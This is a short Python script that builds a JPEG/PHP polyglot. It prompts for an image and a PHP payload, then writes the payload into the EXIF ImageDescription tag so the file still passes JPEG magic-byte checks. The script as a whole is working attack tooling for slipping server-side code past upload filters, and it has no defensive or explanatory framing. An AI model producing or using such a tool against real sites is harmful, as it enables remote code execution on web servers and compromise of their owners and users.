from PIL import Image
from PIL.JpegImagePlugin import get_sampling
import piexif

def is_valid_jpeg(path):
    with open(path, 'rb') as f:
        magic = f.read(3)
        return magic == b'\xFF\xD8\xFF'

# Get input
jpeg_path = input("Enter the path to the JPEG file: ").strip()
php_payload = input("Enter the PHP payload (e.g. <?php echo test; ?>): ").strip()
output_file = input("Enter the output file name [default: polyglot.jpg]: ").strip()
if not output_file:
    output_file = 'polyglot.jpg'

try:
    # Verify magic bytes
    if not is_valid_jpeg(jpeg_path):
        print("[!] The file is not a valid JPEG (wrong magic bytes). Aborting.")
        exit(1)

    # Load image
    img = Image.open(jpeg_path)

    # Load or create EXIF data
    try:
        exif_dict = piexif.load(img.info.get("exif", b""))
    except Exception:
        exif_dict = {"0th": {}, "Exif": {}, "GPS": {}, "1st": {}, "thumbnail": None}

    # Insert PHP payload into UserComment (or any suitable EXIF tag)
    exif_dict["0th"][piexif.ImageIFD.ImageDescription] = php_payload.encode('utf-8')

    # Dump new EXIF
    exif_bytes = piexif.dump(exif_dict)

    # Save polyglot file
    img.save(output_file, "jpeg", exif=exif_bytes)

    print(f"[+] Polyglot file written to: {output_file}")
    print(f"[i] PHP payload added to EXIF ImageDescription tag.")

except FileNotFoundError:
    print(f"[!] Error: The file '{jpeg_path}' was not found.")
except Exception as e:
    print(f"[!] An error occurred: {e}")
